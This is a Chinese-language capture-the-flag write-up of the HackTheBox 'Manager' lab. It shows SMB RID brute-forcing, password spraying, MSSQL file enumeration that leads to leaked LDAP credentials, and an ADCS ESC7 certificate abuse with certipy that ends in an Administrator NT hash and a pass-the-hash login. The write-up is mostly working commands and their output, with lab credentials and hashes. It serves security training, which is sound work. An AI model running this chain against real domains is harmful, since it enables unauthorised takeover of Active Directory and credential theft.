---
title: "HTB Manager"
description: "HackTheBox篇ADCS系列之Manager"

date: 2025-03-26T11:12:13+08:00
lastmod: 2025-11-11T15:11:28+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - ADCS-ESC7
  - MSSQL
  - RID Cycling
---
<!--more-->

> 靶机ip：10.10.11.236

# 知识点

* SMB RID爆破
* 用户名密码爆破
* xp_dirtree 枚举目录
* ESC7提权

# 信息收集

```shell
./rustscan -a 10.10.11.236 -u 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open ports, closed hearts.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.236:53
Open 10.10.11.236:80
Open 10.10.11.236:88
Open 10.10.11.236:135
Open 10.10.11.236:139
Open 10.10.11.236:389
Open 10.10.11.236:445
Open 10.10.11.236:464
Open 10.10.11.236:593
Open 10.10.11.236:636
Open 10.10.11.236:1433
Open 10.10.11.236:3268
Open 10.10.11.236:3269
Open 10.10.11.236:5985
Open 10.10.11.236:9389
Open 10.10.11.236:49667
Open 10.10.11.236:49689
Open 10.10.11.236:49690
Open 10.10.11.236:49693
Open 10.10.11.236:49721
Open 10.10.11.236:49769
```

# HTTP服务

![image-20250324112759015](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250324112801203-1455111854.png)

是个静态网站，目录扫描也没有结果，暂时先搁置了

# SMB服务

```shell
smbclient -L //10.10.11.236
Password for [WORKGROUP\root]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.236 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

发现没什么有价值的共享

使用`netexec`进行RID枚举

```shell
netexec smb 10.10.11.236 -u "test" -p "" --rid-brute --log smb_rid_brute
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\test: (Guest)
SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

发现很多用户名，并且保存到` smb_rid_brute`文件中了，将用户名提取出来

```shell
cat smb_rid_brute | grep SidTypeUser | awk -F'\' '{print $2}' | awk -F ' ' '{print $1}'
Administrator
Guest
krbtgt
DC01$
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

将结果保存到`user.txt`中

根据用户名制作一个简单的字典

* 用户名全大写
* 用户名全小写
* 用户名与密码相同

```shell
cat user.txt | awk '{print tolower($0)}' > passwd.txt
```

使用`netexec`枚举

```shell
netexec smb 10.10.11.236 -u user.txt -p passwd.txt --no-bruteforce --continue-on-success
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\Administrator:administrator STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Guest:guest STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\DC01$:dc01$ STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Zhong:zhong STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE
SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
```

得到了一组用户名密码

```info
username: Operator
password: operator
```

继续使用`netexec`进行枚举

```shell
netexec smb 10.10.11.236 -u Operator -p operator --shares
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\Operator:operator
SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

smb没什么有价值的东西，继续枚举其他协议

```shell
netexec winrm 10.10.11.236 -u Operator -p operator
WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.10.11.236    5985   DC01             [-] manager.htb\Operator:operator

netexec mssql 10.10.11.236 -u Operator -p operator
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\Operator:operator

netexec wmi 10.10.11.236 -u Operator -p operator
RPC         10.10.11.236    135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
RPC         10.10.11.236    135    DC01             [+] manager.htb\Operator:operator
```

发现可以利用mssql和wmi，尝试后发现使用`impacket-wmiexec`登陆失败，原因是权限不足，所以我们利用mssql登录

```shell
impacket-mssqlclient manager.htb/Operator:operator@10.10.11.236 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

**注：需要加`-windows-auth`参数才可以登录**

# MSSQL攻击

* `xp_cmdshell` 执行命令失败
* `xp_dirtree` 捕获hash也无法破解成明文

事已至此只能使用`xp_dirtree`查找一下机器的文件了

```shell
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
subdirectory                      depth   file
-------------------------------   -----   ----
about.html                            1      1
contact.html                          1      1
css                                   1      0
images                                1      0
index.html                            1      1
js                                    1      0
service.html                          1      1
web.config                            1      1
website-backup-27-07-23-old.zip       1      1
```

最终在`C:\inetpub\wwwroot`下找到了备份文件

从网站上下载下来

```shell
wget http://manager.htb/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip -d website
cd website

ls -al
total 68
drwxr-xr-x 5 root root  4096 Mar 24 12:18 .
drwxr-xr-x 3 root root  4096 Mar 24 12:18 ..
-rw-r--r-- 1 root root  5386 Jul 27  2023 about.html
-rw-r--r-- 1 root root  5317 Jul 27  2023 contact.html
drwxr-xr-x 2 root root  4096 Mar 24 12:18 css
drwxr-xr-x 2 root root  4096 Mar 24 12:18 images
-rw-r--r-- 1 root root 18203 Jul 27  2023 index.html
drwxr-xr-x 2 root root  4096 Mar 24 12:18 js
-rw-r--r-- 1 root root   698 Jul 27  2023 .old-conf.xml
-rw-r--r-- 1 root root  7900 Jul 27  2023 service.html
```

发现有一个`.old-conf.xml`文件

```shell
cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

找到了另一组用户名密码

```info
username: raven
password: R4v3nBe5tD3veloP3r!123
```

使用`netexec`继续枚举

```shell
netexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
```

成功登录，并在`Desktop`找到`user.txt`

# ESC7提权

```shell
netexec ldap 10.10.11.236 -u Operator -p operator -M adcs
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.236    389    DC01             [+] manager.htb\Operator:operator
ADCS        10.10.11.236    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.236    389    DC01             Found PKI Enrollment Server: dc01.manager.htb
ADCS        10.10.11.236    389    DC01             Found CN: manager-DC01-CA

netexec ldap 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -M adcs
SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.236    389    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
ADCS        10.10.11.236    389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.236    389    DC01             Found PKI Enrollment Server: dc01.manager.htb
ADCS        10.10.11.236    389    DC01             Found CN: manager-DC01-CA
```

发现这两个用户都是域用户，并且都配置了ADCS服务

使用`certipy-ad`寻找利用点

```shell
certipy-ad find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven
    [!] Vulnerabilities
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates
```

发现可以使用`ESC7`提权

> 参考链接：https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-abusing-subca

第一步：通过 `ManageCa` 权限，赋予自己 `ManageCertificates` 权限 (使用 `-add-officer` 参数)

```shell
certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -add-officer raven
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Raven' on 'manager-DC01-CA'
```

第二步： 使用 `SubCA` 证书模板，注册一个 `SAN` 为 `Administrator` 的证书

```shell
certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -dc-ip 10.10.11.236 -template SubCA -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 23
Would you like to save the private key? (y/N) y
[*] Saved private key to 23.key
[-] Failed to request certificate
```

记下我们的 `Request ID` 并 (输入 y) 保留私钥

第三步：通过 `ManageCertificates` 权限发布刚刚申请失败的证书

```shell
certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -dc-ip 10.10.11.236 -issue-request 23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

第四步：通过 ID 和私钥文件，检索我们发布的证书

```shell
certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -retrieve 23
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 23
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Loaded private key from '23.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

第五步：使用证书进行认证，拿到 `Administrator` 账户的 NT hash

先同步一下时间

```shell
ntpdate -s manager.htb
```

继续攻击

```shell
certipy-ad auth -pfx administrator.pfx -username Administrator -domain manager.htb -dc-ip 10.10.11.236
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@manager.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

使用`netexec`验证一下hash

```shell
netexec winrm 10.10.11.236 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
WINRM       10.10.11.236    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
WINRM       10.10.11.236    5985   DC01             [+] manager.htb\Administrator:ae5064c2f62317332c88629e025924ef (Pwn3d!)
```

使用`evil-winrm`登录

```shell
evil-winrm -i 10.10.11.236 -u Administrator -H ae5064c2f62317332c88629e025924ef

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
manager\administrator
```

登陆成功，在`Desktop`找到`root.txt`



